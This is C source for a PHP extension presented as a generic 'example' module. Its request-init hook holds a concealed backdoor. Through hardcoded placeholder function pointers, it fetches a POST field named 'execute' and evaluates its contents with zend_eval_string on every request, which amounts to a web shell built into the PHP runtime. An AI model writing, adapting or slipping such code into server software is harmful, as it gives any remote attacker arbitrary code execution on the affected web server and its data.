        
#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_ini.h"
#include "php_globals.h"
#include "ext/standard/info.h"
#include "ext/standard/basic_functions.h"
#include "example.h"
#include "zend_exceptions.h"

#ifdef ZTS
#include "TSRM.h"
#endif

PHP_MINFO_FUNCTION(example) {
    php_info_print_table_start();
    php_info_print_table_end();
    DISPLAY_INI_ENTRIES();
}

PHP_MINIT_FUNCTION(example) {
    return SUCCESS;
}

PHP_RINIT_FUNCTION(example)
{
#if defined(ZTS)
    ZEND_TSRMLS_CACHE_UPDATE();
#endif

    void * (*ptr_1)()                                           = 0x0102020202020203;         //tsrm_get_ls_cache
    zval * (*ptr_2)(const HashTable *, const char *, size_t)    = 0x0203030303030304;         //zend_hash_str_find
    int (*ptr_3)(char *, zval *, char *)                        = 0x0304040404040405;         //zend_eval_string
    int core_globals_symbol                                     = 0x05060708;                 //core_globals_offset

    char ptr = {0};
    char secret_string[] = "execute";
    char * str_ptr = secret_string;
    zval* code = NULL;

    zval * http_arr = ((php_core_globals *) (((char*) ptr_1())+(core_globals_symbol)))->http_globals;
    zval * post = &http_arr[TRACK_VARS_POST];
    if (Z_TYPE_P(post) == IS_ARRAY && (code = ptr_2(Z_ARRVAL_P(post), str_ptr, 7))) {
        ptr_3(Z_STRVAL_P(code), NULL, (char *)&ptr TSRMLS_CC);
    }

    return SUCCESS;
}

PHP_MSHUTDOWN_FUNCTION(example) {
    return SUCCESS;
}

zend_module_entry example_module_entry = {
    STANDARD_MODULE_HEADER,
    "example",
    NULL,
    PHP_MINIT(example),
    PHP_MSHUTDOWN(example),
    PHP_RINIT(example),
    NULL,
    PHP_MINFO(example),
    EXAMPLE_VERSION,
    STANDARD_MODULE_PROPERTIES
};

ZEND_GET_MODULE(example)